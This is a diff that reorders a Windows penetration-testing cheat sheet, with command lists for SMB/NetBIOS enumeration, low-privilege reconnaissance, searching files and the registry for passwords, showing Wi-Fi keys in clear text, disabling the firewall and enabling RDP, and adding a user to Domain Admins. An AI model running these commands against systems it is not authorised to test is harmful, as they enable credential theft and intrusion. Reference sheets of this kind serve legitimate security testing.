@@ -49,53 +49,6 @@ smbmap -H <target IP> -u <user> -p <password>
 proxychains smbclient '//10.0.0.10/c$' -U 'domain.local/username%password'
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# NetBIOS and SMB
-
-smbmap -H <target IP>                             Check for access to open shares
-
-enum -G <target IP>
-enum -P <target IP>
-
-nbtenum -r <target IP>
-nbtenum -q <target IP>
-
-nbtscan -r <target range>
-nbtscan -f hosts.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Enumeration using a low level account
-
-hostname
-whoami
-whoami /groups
-systeminfo                                        Show system info, hot fixes, and domain name
-net users                                         Local users
-net localgroup Administrators                     Local administrators
-
-ipconfig /all
-route print
-arp -a
-netstat -ano | findstr "LISTEN"
-netstat -ano | findstr "ESTABLISH
-
-nltest /dclist:<domain>                           Show domain controllers
-nltest /domain_trusts                             Show domain trusts
-
-net group "domain admins" /domain
-net group "enterprise admins" /domain
-net group "Domain Computers" /domain
-
-doskey /history                                   Show command history
-gpresult /z
-
-net share
-
-dir /s *pass* == *cred* == *vnc* == *.config*
-findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Firewall
 
 netsh firewall show state
@@ -110,6 +63,53 @@ netsh wlan show networks
 netsh wlan show profiles
 netsh wlan show profiles name="name"
 show profiles name="name" key=clear
+
+- Open RDP in the firewall, start the service and login
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall set opmode disable
+sc config termservice start= auto
+
+rdesktop -u <user> -p <password> <target IP>
+rdesktop -u <user> -p <password> -g 1440x900 <target IP>         Set a larger window size than the default
+rdesktop -u <user> -p <password> -g 85% <target IP>              Set a smaller window size using a percentage of the default
+rdesktop -u <user> -p <password> -g 85% -r disk:share=/root/     <target IP>
+
+ctrl + alt + enter                                               Toggle full screen mode
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# NetBIOS and SMB
+
+smbmap -H <target IP>                             Check for access to open shares
+
+enum -G <target IP>
+enum -P <target IP>
+
+nbtenum -r <target IP>
+nbtenum -q <target IP>
+
+nbtscan -r <target range>
+nbtscan -f hosts.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# OS Versions
+
+Windows NT 4                                      4.0
+Windows 2000                                      5.0
+Windows XP                                        5.1
+Windows Server 2003, 2003 R2                      5.2
+Windows Vista, Server 2008                        6.0
+Windows 7, Server 2008 R2                         6.1
+Windows 8, Server 2012                            6.2
+Windows 8.1, Server 2012 R2                       6.3
+Windows 10, Server 2016, Server 2019              10.0
+
+PS C:\> Get-WmiObject -Class win32_OperatingSystem | select version, buildnumber
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Services
+
+PS C:\> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # User Accounts
@@ -146,18 +146,36 @@ net user <user> <password> /add /domain           Add a user to the domain
 net group "Domain Admins" <user> /add /domain     Add a user to a specific Security Group on the domain
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Open RDP in the firewall, start the service and login
+# Enumerate using a low level account
 
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-netsh firewall set opmode disable
-sc config termservice start= auto
+hostname
+whoami
+whoami /groups
+systeminfo                                        Show system info, hot fixes, and domain name
+net share                                         Shared folders
+net users                                         Local users
+net localgroup Administrators                     Local administrators
 
-rdesktop -u <user> -p <password> <target IP>
-rdesktop -u <user> -p <password> -g 1440x900 <target IP>     Set a larger window size than the default
-rdesktop -u <user> -p <password> -g 85% <target IP>          Set a smaller window size using a percentage of the default
-rdesktop -u <user> -p <password> -g 85% -r disk:share=/root/ <target IP>
+ipconfig /all
+route print
+arp -a
+netstat -ano | findstr "LISTEN"
+netstat -ano | findstr "ESTABLISH
 
-ctrl + alt + enter                                Toggle full screen mode
+nltest /dclist:<domain>                           Show domain controllers
+nltest /domain_trusts                             Show domain trusts
+
+net group "domain admins" /domain
+net group "enterprise admins" /domain
+net group "Domain Computers" /domain
+
+doskey /history                                   Show command history
+gpresult /z
+
+dir /s *pass* == *cred* == *vnc* == *.config*
+findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
